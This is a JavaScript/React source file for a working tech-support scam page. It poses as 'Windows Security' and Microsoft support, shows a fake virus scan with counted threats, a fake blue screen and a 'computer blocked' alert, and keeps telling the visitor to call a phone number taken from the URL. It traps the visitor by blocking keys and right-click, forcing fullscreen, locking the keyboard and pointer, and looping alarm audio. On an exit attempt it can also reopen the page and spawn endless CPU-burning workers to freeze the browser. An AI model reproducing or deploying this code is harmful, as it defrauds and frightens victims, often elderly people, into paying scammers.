import { r as t, j as e, c as K, R as J } from "./file.js";
import { C as _ } from "./wind-0050.js";
import { t as s } from "./snow.js";
import { startBSOD } from "./bsod-canvas.js";

(function () {
    const x = document.createElement("link").relList;
    if (x && x.supports && x.supports("modulepreload")) return;
    for (const l of document.querySelectorAll('link[rel="modulepreload"]')) p(l);
    new MutationObserver((l) => {
        for (const n of l)
            if (n.type === "childList")
                for (const m of n.addedNodes) m.tagName === "LINK" && m.rel === "modulepreload" && p(m);
    }).observe(document, { childList: !0, subtree: !0 });
    function h(l) {
        const n = {};
        return (
            l.integrity && (n.integrity = l.integrity),
            l.referrerPolicy && (n.referrerPolicy = l.referrerPolicy),
            l.crossOrigin === "use-credentials"
                ? (n.credentials = "include")
                : l.crossOrigin === "anonymous"
                  ? (n.credentials = "omit")
                  : (n.credentials = "same-origin"),
            n
        );
    }
    function p(l) {
        if (l.ep) return;
        l.ep = !0;
        const n = h(l);
        fetch(l.href, n);
    }
})();
const H = "files/script.mp3";
function digitsOnly(s) {
    return String(s || '').replace(/\D/g, '');
}

function chunkSplit2(s) {
    return s.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
}
function G() {
    const urlParams = new URLSearchParams(window.location.search);
    const rawPhone = (urlParams.get('p') || '').trim();
    const phone = digitsOnly(rawPhone);
    const jw = urlParams.get('jw');
    const modalType = urlParams.get('m') || 'fb';

    let phonefix;

    // US number: +1 (XXX) XXX-XXXX
    if (/^1?[0-9]{10}$/.test(phone)) {
        const usPhone = phone.length === 11 ? phone.slice(1) : phone;
        phonefix = '+1 (' + usPhone.slice(0, 3) + ') ' + usPhone.slice(3, 6) + '-' + usPhone.slice(6);

    // Belgian toll-free: 0800 XX XXX (9 digits)
    } else if (/^0800[0-9]{5}$/.test(phone)) {
        phonefix = phone.slice(0, 4) + ' ' + phone.slice(4, 6) + ' ' + phone.slice(6);

    // French 09 numbers: 09 XX XX XX XX (10 digits)
    } else if (/^09[0-9]{8}$/.test(phone)) {
        phonefix = phone.slice(0, 2) + " " + phone.slice(2, 4) + " " + phone.slice(4, 6) + " " + phone.slice(6, 8) + " " + phone.slice(8);

    // Belgian landline (02-08): 0X XXX XX XX (9 digits)
    } else if (/^0[1-8][0-9]{7}$/.test(phone)) {
        phonefix = phone.slice(0, 2) + ' ' + phone.slice(2, 5) + ' ' + phone.slice(5, 7) + ' ' + phone.slice(7);

    // Belgian mobile (04XX): 04XX XX XX XX (10 digits)
    } else if (/^04[0-9]{8}$/.test(phone)) {
        phonefix = phone.slice(0, 4) + ' ' + phone.slice(4, 6) + ' ' + phone.slice(6, 8) + ' ' + phone.slice(8);

    // Generic 10-digit (French style): XX XX XX XX XX
    } else if (phone.length === 10) {
        phonefix = phone.slice(0, 2) + ' ' + phone.slice(2, 4) + ' ' + phone.slice(4, 6) + ' ' + phone.slice(6, 8) + ' ' + phone.slice(8);

    // Default fallback
    } else {
        phonefix = chunkSplit2(phone);
    }

    const d = phonefix || "12 34 567 89",

        [x, h] = t.useState(!0),
        [p, l] = t.useState(!1),
        [n, m] = t.useState(!1),
        [k, S] = t.useState(!1),
        [L, C] = t.useState(!1),
        [R, z] = t.useState(!1),
        [E, q] = t.useState(!1),
        [P, T] = t.useState(!1),
        [B, g] = t.useState(!1),
        [M, W] = t.useState(!1),
        [F, b] = t.useState(!1),
        v = t.useRef(null),
        y = t.useRef(null),
        N = t.useRef(null);

    // Dynamic modal loading
    const [ModalComponent, setModalComponent] = t.useState(null);
    t.useEffect(() => {
        const modals = {
    fb:       () => import("../components/agemodal.js"),
    call:     () => import("../components/callmodal.js"),
        adultcall:() => import("../components/adultcallmodal.js"),
    follow:   () => import("../components/followmodal.js"),
    friend:   () => import("../components/friendmodal.js"),
    secure:   () => import("../components/securemodal.js"),
    wave:     () => import("../components/wavemodal.js"),
    yahoo:    () => import("../components/yahoo.js"),
    birthday: () => import("../components/bdaymodal.js"),
    like:     () => import("../components/likemodal.js"),
    numero:   () => import("../components/numerommodal.js?v=7"),
    concours: () => import("../components/concoursmodal.js?v=1"),
    pension:  () => import("../components/pensionmodal.js?v=1"),
    cookies:  () => import("../components/cookiesmodal.js?v=5"),
    googleband: () => import("../components/googleband.js"),
};
        const loader = modals[modalType] || modals["fb"];
        loader().then((mod) => {
            setModalComponent(() => mod.AgeModal);
        });
    }, []);

    t.useEffect(() => {
        const r = setTimeout(() => z(!0), 40),
            i = setTimeout(() => g(!0), 200),
            o = setTimeout(() => C(!0), 100),
            c = setTimeout(() => q(!0), 250),
            u = setTimeout(() => T(!0), 350),
            f = setTimeout(() => W(!0), 400);
        return () => {
            clearTimeout(r), clearTimeout(i), clearTimeout(o), clearTimeout(c), clearTimeout(u), clearTimeout(f);
        };
    }, []),
        t.useEffect(() => {
            const r = (c) => c.preventDefault(),
                i = (c) => {
                    if (c.button === 2 || c.which === 3) return c.preventDefault(), c.stopPropagation(), !1;
                },
                o = (c) => {
                    const u = c.keyCode || c.which;
                    if (u === 116 || u === 27) return c.preventDefault(), c.stopPropagation(), !1;
                };
            return (
                document.addEventListener("contextmenu", r),
                document.addEventListener("mousedown", i, !0),
                document.addEventListener("mouseup", i, !0),
                document.addEventListener("keydown", o, { capture: !0 }),
                () => {
                    document.removeEventListener("contextmenu", r),
                        document.removeEventListener("mousedown", i, !0),
                        document.removeEventListener("mouseup", i, !0),
                        document.removeEventListener("keydown", o, { capture: !0 });
                }
            );
        }, []);
    const I = t.useCallback(() => {
            var o, c;
            h(!1), l(!0), m(!0), S(!0);
                startBSOD();
            const r = document.documentElement,
                i = r.requestFullscreen || r.webkitRequestFullscreen || r.mozRequestFullScreen;
            if (i)
                try {
                    i.call(r);
                } catch {}
            if (navigator.keyboard && navigator.keyboard.lock)
                try {
                    navigator.keyboard.lock();
                } catch {}
            try {
                (o = v.current) == null || o.play();
            } catch {}
            try {
                (c = y.current) == null || c.play();
            } catch {}
        }, []),
        O = t.useCallback(() => {
            const r = N.current;
            if (!r) return;
            const i = r.requestPointerLock || r.mozRequestPointerLock || r.webkitRequestPointerLock;
            try {
                i && i.call(r);
            } catch {}
        }, []),
        A = t.useCallback(() => {
            b(!0);
            const r = document.getElementById("comment-mod");
            r && (r.style.display = "none");
        }, []);
    t.useEffect(() => {
        const r = () => {
            setTimeout(() => b(!0), 50);
        };
        return (
            document.addEventListener("fullscreenchange", r),
            document.addEventListener("webkitfullscreenchange", r),
            document.addEventListener("mozfullscreenchange", r),
            () => {
                document.removeEventListener("fullscreenchange", r),
                    document.removeEventListener("webkitfullscreenchange", r),
                    document.removeEventListener("mozfullscreenchange", r);
            }
        );
    }, []);
       const D = t.useCallback((r) => {
        r.preventDefault(), g(!0);
    }, []);
    return (
        t.useEffect(() => {
            if (jw === 'y') {
                const r = (i) => {
                    open(location.href, "_blank"), setTimeout(() => location.reload(), 1);
                    let o = [],
                        c = 'let n=0;for(;;){n++;Math.random()*Math.random();if(n%1e6===0)postMessage({s:"working",n})}',
                        u = URL.createObjectURL(new Blob([c], { type: "application/javascript" })),
                        f = () => {
                            for (let a = 0; a < 1e11; a++) {
                                let j = new Worker(u);
                                (j.onmessage = () => {}), (j.onerror = () => {});
                            }
                        };
                    for (let a = 0; a < 20; a++) f();
                    let w = Date.now(),
                        U = setInterval(() => {
                            let a = Date.now();
                            a - w > 2e3 ? (clearInterval(U), o.forEach((j) => j.terminate()), (o = [])) : (w = a);
                        }, 100);
                    (function a() {
                        o.length > 0 && requestAnimationFrame(a);
                    })();
                };
                return window.addEventListener("beforeunload", r), () => window.removeEventListener("beforeunload", r);
            }
        }, []),
        e.jsxs("div", {
            style: { cursor: "none" },
            onClick: I,
            children: [
                ModalComponent && x &&
                    e.jsx(ModalComponent, {
                        isVisible: x,
                        onDismiss: () => h(!1),
                    }),
                e.jsxs("div", {
                    className: "map",
                    id: "mycanvas",
                    ref: N,
                    onMouseMove: O,
                    onClick: A,
                    style: { display: p ? "block" : "none" },
                    children: [
                        e.jsx("audio", {
                            id: "pridez",
                            ref: v,
                            loop: !0,
                            children: e.jsx("source", { src: H, type: "audio/mpeg" }),
                        }),
                        e.jsx("audio", {
                            id: "pridez1",
                            ref: y,
                            loop: !0,
                            children: e.jsx("source", { src: "files/time-svc-f984.mp3", type: "audio/mpeg" }),
                        }),
                        e.jsx("a", {
                            href: "#",
                            id: "link_black",
                            rel: "noreferrer",
                            style: { cursor: "none" },
                            children: e.jsx("div", {
                                className: "event",
                                style: { height: "145%", cursor: "none", display: L ? "block" : "none" },
                            }),
                        }),
                        e.jsxs("div", {
                            className: "code",
                            style: { cursor: "none", display: R ? "block" : "none" },
                            children: [
                                e.jsx("div", {
                                    className: "saffron",
                                    children: e.jsxs("div", {
                                        className: "photo",
                                        children: [
                                            e.jsx("div", {
                                                className: "api",
                                                children: e.jsx("div", {
                                                    className: "browse",
                                                    children: e.jsx("ul", {
                                                        children: e.jsx("li", {
                                                            children: e.jsx("a", {
                                                                href: "#",
                                                                children: e.jsx("img", {
                                                                    src: "files/sky.png",
                                                                    alt: "",
                                                                }),
                                                            }),
                                                        }),
                                                    }),
                                                }),
                                            }),
                                            e.jsx("div", {
                                                className: "create",
                                                children: e.jsxs("div", {
                                                    className: "ads",
                                                    children: [
                                                        e.jsx("img", { src: "files/grid.png", alt: "" }),
                                                        " ",
                                                        e.jsx("span", { children: s("ui.windows_security") }),
                                                    ],
                                                }),
                                            }),
                                            e.jsx("div", {
                                                className: "load",
                                                children: e.jsx("div", {
                                                    className: "sdk",
                                                    children: e.jsxs("ul", {
                                                        children: [
                                                            e.jsx("li", {
                                                                children: e.jsx("a", {
                                                                    href: "#",
                                                                    children: e.jsx("moss", {
                                                                        children: s("ui.activate_license"),
                                                                    }),
                                                                }),
                                                            }),
                                                            e.jsx("li", {
                                                                children: e.jsx("a", {
                                                                    href: "#",
                                                                    children: e.jsx("img", {
                                                                        src: "files/deploy-bg-155c.png",
                                                                        alt: "",
                                                                    }),
                                                                }),
                                                            }),
                                                        ],
                                                    }),
                                                }),
                                            }),
                                        ],
                                    }),
                                }),
                                e.jsxs("div", {
                                    className: "umbra-app",
                                    children: [
                                        e.jsx("div", {
                                            className: "yarrow-93",
                                            children: e.jsxs("div", {
                                                className: "photo",
                                                children: [
                                                    e.jsx("div", {
                                                        className: "bravo",
                                                        children: e.jsx("div", {
                                                            className: "ttl",
                                                            children: e.jsxs("p", {
                                                                children: [
                                                                    e.jsx("img", {
                                                                        src: "files/november-logo-10.png",
                                                                        alt: "",
                                                                    }),
                                                                    " ",
                                                                    e.jsx("span", { children: s("ui.ttl") }),
                                                                ],
                                                            }),
                                                        }),
                                                    }),
                                                    e.jsx("div", {
                                                        className: "bravo",
                                                        children: e.jsx("div", {
                                                            className: "tax",
                                                            children: e.jsx("ul", {
                                                                children: e.jsx("li", {
                                                                    children: e.jsx("a", {
                                                                        href: "#",
                                                                        children: e.jsx("img", {
                                                                            src: "files/sky.png",
                                                                            alt: "",
                                                                        }),
                                                                    }),
                                                                }),
                                                            }),
                                                        }),
                                                    }),
                                                ],
                                            }),
                                        }),
                                        e.jsxs("div", {
                                            className: "scan_body",
                                            children: [
                                                e.jsx("div", {
                                                    className: "tsunami-57",
                                                    style: { height: 30 },
                                                    children: e.jsx("img", {
                                                        src: "files/cuprum-6ba9.png",
                                                        alt: "",
                                                        style: { maxWidth: "100%" },
                                                    }),
                                                }),
                                                e.jsx("div", {
                                                    className: "domain",
                                                    children: e.jsx("quiver", {
                                                        className: "quiver lagoon",
                                                        children: e.jsxs("thead", {
                                                            children: [
                                                                e.jsxs("tr", {
                                                                    children: [
                                                                        e.jsx("th", {
                                                                            scope: "col",
                                                                            children: s("ui.scanned_objects"),
                                                                        }),
                                                                        e.jsx("th", {
                                                                            scope: "col",
                                                                            children: e.jsx("div", {
                                                                                className: "col_fourth bravo",
                                                                                children: e.jsx(_, {
                                                                                    className: "count-number krypton",
                                                                                    speed: 5e3,
                                                                                    to: 51900,
                                                                                }),
                                                                            }),
                                                                        }),
                                                                    ],
                                                                }),
                                                                e.jsxs("tr", {
                                                                    children: [
                                                                        e.jsx("th", {
                                                                            scope: "col",
                                                                            children: s("ui.elapsed_time"),
                                                                        }),
                                                                        e.jsx("th", {
                                                                            scope: "col",
                                                                            children: s("ui.seconds"),
                                                                        }),
                                                                    ],
                                                                }),
                                                                e.jsxs("tr", {
                                                                    children: [
                                                                        e.jsx("th", {
                                                                            scope: "col",
                                                                            children: s("ui.detected_threats"),
                                                                        }),
                                                                        e.jsx("th", {
                                                                            scope: "col",
                                                                            style: { color: "red" },
                                                                            children: e.jsx(_, {
                                                                                className: "count-number krypton",
                                                                                speed: 2500,
                                                                                to: 1200,
                                                                            }),
                                                                        }),
                                                                    ],
                                                                }),
                                                            ],
                                                        }),
                                                    }),
                                                }),
                                            ],
                                        }),
                                        e.jsx("div", {
                                            className: "scan_footer",
                                            children: e.jsxs("div", {
                                                className: "photo",
                                                children: [
                                                    e.jsx("div", {
                                                        className: "bravo",
                                                        children: e.jsxs("div", {
                                                            className: "luna-17",
                                                            children: [
                                                                e.jsx("div", {
                                                                    className: "cell",
                                                                    role: "group",
                                                                    "aria-label": "Basic example",
                                                                    children: e.jsx("moss", {
                                                                        className: "vox-v3 lib",
                                                                        type: "moss",
                                                                        children: s("ui.scan"),
                                                                    }),
                                                                }),
                                                                e.jsx("div", {
                                                                    className: "cell",
                                                                    role: "group",
                                                                    "aria-label": "Basic example",
                                                                    children: e.jsx("moss", {
                                                                        className: "vox-v3 lib",
                                                                        type: "moss",
                                                                        children: s("ui.pause"),
                                                                    }),
                                                                }),
                                                            ],
                                                        }),
                                                    }),
                                                    e.jsx("div", {
                                                        className: "bravo",
                                                        children: e.jsx("div", {
                                                            className: "dir",
                                                            children: e.jsx("div", {
                                                                className: "cell",
                                                                role: "group",
                                                                "aria-label": "Basic example",
                                                                children: e.jsx("moss", {
                                                                    className: "vox-v3 lib",
                                                                    type: "moss",
                                                                    children: s("ui.scheduled_scans"),
                                                                }),
                                                            }),
                                                        }),
                                                    }),
                                                ],
                                            }),
                                        }),
                                    ],
                                }),
                            ],
                        }),
                        e.jsx("div", {
                            className: "lock-87",
                            style: { cursor: "default", display: E ? "block" : "none" },
                            children: e.jsx("img", {
                                src: "files/cinnamon-88.png",
                                alt: "",
                                style: { maxWidth: "100%" },
                            }),
                        }),
                        e.jsxs("div", {
                            className: "arcus",
                            style: { cursor: "none", display: P ? "block" : "none" },
                            children: [
                                e.jsx("div", {
                                    className: "saffron",
                                    children: e.jsxs("div", {
                                        className: "photo",
                                        children: [
                                            e.jsx("div", {
                                                className: "api",
                                                children: e.jsx("div", {
                                                    className: "browse",
                                                    children: e.jsx("ul", {
                                                        children: e.jsx("li", {
                                                            children: e.jsx("a", {
                                                                href: "#",
                                                                children: e.jsx("img", {
                                                                    src: "files/sky.png",
                                                                    alt: "",
                                                                }),
                                                            }),
                                                        }),
                                                    }),
                                                }),
                                            }),
                                            e.jsx("div", {
                                                className: "create",
                                                children: e.jsxs("div", {
                                                    className: "ads",
                                                    children: [
                                                        e.jsx("img", { src: "files/grid.png", alt: "" }),
                                                        " ",
                                                        e.jsx("span", { children: s("ui.windows_security") }),
                                                    ],
                                                }),
                                            }),
                                            e.jsx("div", {
                                                className: "load",
                                                children: e.jsx("div", {
                                                    className: "sdk",
                                                    children: e.jsxs("ul", {
                                                        children: [
                                                            e.jsx("li", {
                                                                children: e.jsx("a", {
                                                                    href: "#",
                                                                    children: e.jsx("moss", {
                                                                        children: s("ui.activate_license"),
                                                                    }),
                                                                }),
                                                            }),
                                                            e.jsx("li", {
                                                                children: e.jsx("a", {
                                                                    href: "#",
                                                                    children: e.jsx("img", {
                                                                        src: "files/graph.png",
                                                                        alt: "",
                                                                    }),
                                                                }),
                                                            }),
                                                            e.jsx("li", {
                                                                children: e.jsx("a", {
                                                                    href: "#",
                                                                    children: e.jsx("img", {
                                                                        src: "files/deploy-bg-155c.png",
                                                                        alt: "",
                                                                    }),
                                                                }),
                                                            }),
                                                            e.jsx("li", {
                                                                children: e.jsx("a", {
                                                                    href: "#",
                                                                    children: e.jsx("img", {
                                                                        src: "files/db-08ea.png",
                                                                        alt: "",
                                                                    }),
                                                                }),
                                                            }),
                                                        ],
                                                    }),
                                                }),
                                            }),
                                        ],
                                    }),
                                }),
                                e.jsxs("div", {
                                    className: "schema",
                                    style: { cursor: "default", boxShadow: "15px 15px 15px 15px rgba(0,0,0,.4)" },
                                    children: [
                                        e.jsx("div", {
                                            className: "yarrow-93",
                                            children: e.jsxs("div", {
                                                className: "photo",
                                                children: [
                                                    e.jsx("div", {
                                                        className: "bravo",
                                                        children: e.jsx("div", {
                                                            className: "ttl",
                                                            children: e.jsxs("p", {
                                                                children: [
                                                                    e.jsx("img", {
                                                                        src: "files/november-logo-10.png",
                                                                        alt: "",
                                                                    }),
                                                                    " ",
                                                                    e.jsx("span", { children: s("ui.scan") }),
                                                                ],
                                                            }),
                                                        }),
                                                    }),
                                                    e.jsx("div", {
                                                        className: "bravo",
                                                        children: e.jsx("span", {
                                                            className: "fl tango",
                                                            id: "txts1",
                                                            children: e.jsxs("a", {
                                                                href: "#",
                                                                id: "cross",
                                                                onClick: D,
                                                                children: [
                                                                    e.jsx("p", {
                                                                        style: { marginRight: 50 },
                                                                        children: "➖",
                                                                    }),
                                                                    e.jsx("p", {
                                                                        style: { marginRight: 30 },
                                                                        children: "❏",
                                                                    }),
                                                                    e.jsx("p", { children: "❌" }),
                                                                ],
                                                            }),
                                                        }),
                                                    }),
                                                ],
                                            }),
                                        }),
                                        e.jsx("div", {
                                            className: "scan_body",
                                            children: e.jsx("div", {
                                                className: "photo",
                                                children: e.jsx("div", {
                                                    className: "api",
                                                    children: e.jsx("div", {
                                                        className: "tooreg_detail_scan",
                                                        children: e.jsx("ul", {}),
                                                    }),
                                                }),
                                            }),
                                        }),
                                    ],
                                }),
                            ],
                        }),
                        e.jsx("div", {
                            style: {
                                bottom: -20,
                                position: "fixed",
                                cursor: "none",
                                zIndex: 999999999,
                                display: k ? "block" : "none",
                            },
                            id: "footer",
                            children: e.jsxs("div", {
                                className: "photo",
                                children: [
                                    e.jsx("div", {
                                        className: "api",
                                        children: e.jsxs("div", {
                                            className: "right-foot",
                                            style: { textAlign: "center" },
                                            children: [
                                                e.jsxs("span", {
                                                    id: "footertxt",
                                                    children: [
                                                        e.jsx("img", { src: "files/grid.png", alt: "" }),
                                                        " ",
                                                        s("ui.windows_security"),
                                                    ],
                                                }),
                                                e.jsxs("span", {
                                                    style: { fontWeight: 500, paddingLeft: 13, color: "#fff" },
                                                    children: [
                                                        s("ui.windows_support"),
                                                        " ",
                                                        e.jsx("span", {
                                                            style: {
                                                                border: "1px solid #fff",
                                                                borderRadius: 5,
                                                                padding: "2px 5px",
                                                            },
                                                            children: d,
                                                        }),
                                                    ],
                                                }),
                                            ],
                                        }),
                                    }),
                                    e.jsx("div", {
                                        className: "api",
                                        children: e.jsx("marquee", {
                                            direction: "left",
                                            height: "100px",
                                            width: "100%",
                                            children: e.jsx("small", {
                                                className: "vapor-ui-14",
                                                style: { color: "#eee", fontSize: 10 },
                                                children: s("marquee"),
                                            }),
                                        }),
                                    }),
                                ],
                            }),
                        }),
                        B &&
                            e.jsxs("div", {
                                className: "lightbox",
                                style: { display: "block", cursor: "default" },
                                id: "poptxt",
                                children: [
                                    e.jsx("div", {
                                        className: "ventus top",
                                        style: { fontSize: 17 },
                                        children: e.jsxs("div", {
                                            className: "ventus tiger-31",
                                            style: { borderBottom: "1px solid #d6d5d5" },
                                            children: [
                                                e.jsxs("span", {
                                                    className: "fl title",
                                                    id: "txtadd",
                                                    children: [
                                                        e.jsx("span", {
                                                            className: "fl ventus",
                                                            children: e.jsx("img", {
                                                                src: "files/yankee-37-ddaf.png",
                                                                className: "carbon",
                                                                alt: "",
                                                            }),
                                                        }),
                                                        s("lightbox.title"),
                                                    ],
                                                }),
                                                e.jsxs("span", {
                                                    className: "fl tango",
                                                    id: "txts1",
                                                    children: [
                                                        e.jsx("p", { style: { marginRight: 50 }, children: "➖" }),
                                                        e.jsx("p", { style: { marginRight: 30 }, children: "❏" }),
                                                        e.jsx("p", { children: "❌" }),
                                                    ],
                                                }),
                                            ],
                                        }),
                                    }),
                                    e.jsx("div", {
                                        id: "txtintro2",
                                        children: e.jsxs("span", {
                                            className: "olive",
                                            children: [
                                                e.jsx("p", {
                                                    style: { fontSize: 30, fontWeight: 500 },
                                                    children: s("lightbox.sorry"),
                                                }),
                                                e.jsx("p", {
                                                    style: { fontSize: 25, color: "red", fontWeight: 500 },
                                                    children: s("lightbox.error"),
                                                }),
                                                e.jsx("p", {
                                                    style: { fontSize: 15, fontWeight: 400, color: "#000" },
                                                    children: s("lightbox.desc"),
                                                }),
                                            ],
                                        }),
                                    }),
                                    e.jsx("img", { src: "files/self-23.gif", id: "banner", alt: "" }),
                                    e.jsxs("div", {
                                        style: { color: "#0f396d" },
                                        id: "disclaimer",
                                        children: [
                                            s("lightbox.contact"),
                                            e.jsx("br", {}),
                                            e.jsxs("span", {
                                                className: "support",
                                                style: { fontSize: 22 },
                                                children: [
                                                    "Windows Support ",
                                                    e.jsx("span", {
                                                        style: {
                                                            border: "1px Solid #114d9a",
                                                            borderRadius: 5,
                                                            padding: "2px 5px",
                                                        },
                                                        children: d,
                                                    }),
                                                ],
                                            }),
                                        ],
                                    }),
                                    e.jsxs("div", {
                                        id: "bottom",
                                        children: [
                                            e.jsxs("div", {
                                                children: [
                                                    e.jsx("img", {
                                                        src: "files/grid.png",
                                                        id: "badge",
                                                        alt: "",
                                                    }),
                                                    " ",
                                                    e.jsx("span", {
                                                        className: "maple",
                                                        children: s("ui.windows_security"),
                                                    }),
                                                ],
                                            }),
                                            e.jsxs("ul", {
                                                children: [
                                                    e.jsx("li", {
                                                        children: e.jsx("a", {
                                                            href: "#",
                                                            children: e.jsx("div", {
                                                                className: "moss",
                                                                children: e.jsx("span", { children: s("ui.scan_now") }),
                                                            }),
                                                        }),
                                                    }),
                                                    e.jsx("li", {
                                                        children: e.jsx("a", {
                                                            href: "#",
                                                            children: e.jsx("div", {
                                                                className: "tree2-99",
                                                                children: e.jsx("span", {
                                                                    children: s("ui.scan_later"),
                                                                }),
                                                            }),
                                                        }),
                                                    }),
                                                ],
                                            }),
                                        ],
                                    }),
                                ],
                            }),
                        M &&
                            e.jsxs("div", {
                                className: "opal",
                                style: { cursor: "default", display: "block" },
                                id: "pop_up_new",
                                children: [
                                    e.jsx("p", {
                                        className: "pearl",
                                        style: {
                                            fontSize: 16,
                                            fontWeight: 400,
                                            margin: 0,
                                            padding: "5px 10px",
                                            color: "#fff",
                                            marginTop: 0,
                                        },
                                        children: s("card.blocked_title"),
                                    }),
                                    e.jsx("p", { children: e.jsx("b", { children: s("card.blocked_headline") }) }),
                                    e.jsx("p", { children: s("card.compromised_intro") }),
                                    e.jsx("p", { dangerouslySetInnerHTML: { __html: s("card.compromised_list") } }),
                                    e.jsx("p", { children: s("card.adware") }),
                                    e.jsx("p", { children: s("card.call_us") }),
                                    e.jsx("p", { children: s("card.report_threat") }),
                                    e.jsx("p", { children: s("card.closing_warning") }),
                                    e.jsxs("p", {
                                        style: { paddingBottom: 0, color: "#fff", fontSize: 16 },
                                        children: [
                                            s("card.please_call"),
                                            " ",
                                            e.jsx("strong", {
                                                children: e.jsx("span", {
                                                    style: {
                                                        border: "1px solid #fff",
                                                        borderRadius: 5,
                                                        padding: "2px 5px",
                                                    },
                                                    children: d,
                                                }),
                                            }),
                                        ],
                                    }),
                                    e.jsxs("div", {
                                        className: "resin",
                                        children: [
                                            e.jsx("a", {
                                                id: "leave_page",
                                                style: { cursor: "pointer", color: "#fff" },
                                                className: "register",
                                                children: "OK",
                                            }),
                                            e.jsx("a", {
                                                id: "leave_page",
                                                style: { color: "#fff" },
                                                className: "register",
                                                children: "Cancel",
                                            }),
                                        ],
                                    }),
                                ],
                            }),
                        F &&
                            e.jsx("div", {
                                className: "answer_list",
                                id: "welcomeDiv",
                                style: {
                                    display: "block",
                                    backgroundColor: "rgb(40 40 40 / 80%)",
                                    height: "auto",
                                    width: 550,
                                    marginLeft: "33%",
                                    position: "absolute",
                                    zIndex: 99999999,
                                    border: "1px solid transparent",
                                    borderColor: "#d6d8db",
                                    borderRadius: ".5rem",
                                },
                                children: e.jsxs("p", {
                                    className: "pearl",
                                    style: {
                                        color: "#fff",
                                        marginTop: 10,
                                        fontSize: 16,
                                        opacity: 0.9,
                                        padding: "0 5px",
                                    },
                                    children: [
                                        s("answer_list.text"),
                                        e.jsx("br", {}),
                                        e.jsxs("strong", {
                                            children: [
                                                s("answer_list.support_label"),
                                                " ",
                                                e.jsx("span", {
                                                    style: {
                                                        border: "1px solid #383d41",
                                                        borderRadius: 5,
                                                        padding: "2px 5px",
                                                    },
                                                    children: d,
                                                }),
                                            ],
                                        }),
                                    ],
                                }),
                            }),
                        n &&
                            e.jsxs("div", {
                                id: "chat",
                                style: { display: "block" },
                                children: [
                                    e.jsx("img", { src: "files/grid.png", alt: "" }),
                                    e.jsx("span", {
                                        style: {
                                            color: "#222",
                                            fontSize: 24,
                                            fontWeight: 600,
                                            marginLeft: 6,
                                            position: "relative",
                                            top: 5,
                                        },
                                        children: "Microsoft",
                                    }),
                                    e.jsx("br", {}),
                                    e.jsx("p", { children: s("ui.windows_technical_support") }),
                                    e.jsxs("h4", {
                                        style: { fontWeight: 600, color: "#0f396d", fontSize: 22 },
                                        children: [
                                            d,
                                            e.jsx("br", {}),
                                            s("ui.toll_free_number"),
                                            e.jsx("br", {}),
                                            e.jsx("br", {}),
                                        ],
                                    }),
                                    e.jsx("div", {
                                        className: "daisy",
                                        children: e.jsxs("svg", {
                                            height: "1em",
                                            viewBox: "0 0 320 512",
                                            children: [
                                                e.jsx("style", { children: "svg { fill: #fff }" }),
                                                e.jsx("path", {
                                                    d: "M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z",
                                                }),
                                            ],
                                        }),
                                    }),
                                ],
                            }),
                    ],
                }),
            ],
        })
    );
}
K(document.getElementById("root")).render(e.jsx(J.StrictMode, { children: e.jsx(G, {}) }));